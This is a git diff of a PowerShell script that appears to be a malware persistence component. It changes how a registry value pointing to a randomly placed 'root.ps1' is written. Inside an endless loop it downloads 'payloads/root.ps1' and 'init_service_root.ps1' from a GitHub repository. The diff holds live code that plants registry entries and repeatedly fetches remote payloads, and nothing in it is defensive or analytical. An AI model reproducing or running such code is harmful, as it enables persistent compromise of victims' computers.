@@ -22,14 +22,12 @@ $canUpdateRootPath = $false
 if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
     $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $rootPath = "$rootPath\root.ps1"
-    red add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
-    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $true
 }
 
 if (-not($item)) {
-    reg add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
-    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $false
 }
 
@@ -73,8 +71,7 @@ while ($true) {
         if($canUpdateRootPath){
             $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootPath = "$rootPath\root.ps1"
-            reg add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
-            #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
         }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
